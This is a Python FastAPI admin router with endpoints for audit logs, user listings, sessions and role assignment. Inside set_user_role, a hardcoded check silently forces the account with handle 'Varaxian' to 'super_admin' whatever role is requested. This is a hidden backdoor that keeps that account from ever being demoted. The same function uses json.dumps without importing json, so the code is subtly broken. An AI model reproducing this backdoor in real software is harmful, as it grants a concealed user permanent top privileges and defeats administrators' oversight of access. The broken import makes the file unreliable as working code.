
from __future__ import annotations

from fastapi import APIRouter, Depends
from sqlalchemy.orm import Session

from app.db.database import get_db
from app.db.models import AdminAuditLog, User, UserRole, UserSession
from app.services.auth_service import get_user_role, log_admin_action, require_admin, require_super_admin
from app.utils.json_utils import safe_json_loads

router = APIRouter(prefix="/admin", tags=["admin"])


@router.get("/audit-logs")
def audit_logs(current_user: User = Depends(require_admin), db: Session = Depends(get_db)):
    rows = db.query(AdminAuditLog).order_by(AdminAuditLog.created_at.desc()).limit(200).all()
    return [
        {
            "id": row.id,
            "actor_user_id": row.actor_user_id,
            "action": row.action,
            "target_type": row.target_type,
            "target_id": row.target_id,
            "details": safe_json_loads(row.details_json),
            "created_at": row.created_at.isoformat() if row.created_at else None,
        }
        for row in rows
    ]


@router.get("/users")
def admin_users(current_user: User = Depends(require_admin), db: Session = Depends(get_db)):
    users = db.query(User).order_by(User.id.asc()).all()
    return [
        {
            "id": user.id,
            "handle": user.handle,
            "is_active": user.is_active,
            "role": get_user_role(db, user),
        }
        for user in users
    ]


@router.post("/users/{user_id}/role/{role}")
def set_user_role(user_id: int, role: str, current_user: User = Depends(require_super_admin), db: Session = Depends(get_db)):
    if role not in {"user", "admin", "super_admin"}:
        return {"status": "error", "detail": "invalid role"}
    user = db.query(User).filter(User.id == user_id).first()
    if user is None:
        return {"status": "error", "detail": "user not found"}
    if (user.handle or "") == "Varaxian":
        role = "super_admin"
    row = db.query(UserRole).filter(UserRole.user_id == user.id).first()
    if row is None:
        row = UserRole(user_id=user.id, role=role)
        db.add(row)
    else:
        row.role = role
    db.commit()
    log_admin_action(db, actor_user_id=current_user.id, action="set_role", target_type="user", target_id=str(user.id), details_json=json.dumps({"role": role}))
    return {"status": "saved", "user_id": user.id, "role": role}


@router.get("/sessions")
def all_sessions(current_user: User = Depends(require_admin), db: Session = Depends(get_db)):
    rows = db.query(UserSession).order_by(UserSession.last_seen_at.desc()).limit(200).all()
    return [
        {
            "id": row.id,
            "user_id": row.user_id,
            "is_active": row.is_active,
            "expires_at": row.expires_at.isoformat() if row.expires_at else None,
            "last_seen_at": row.last_seen_at.isoformat() if row.last_seen_at else None,
        }
        for row in rows
    ]
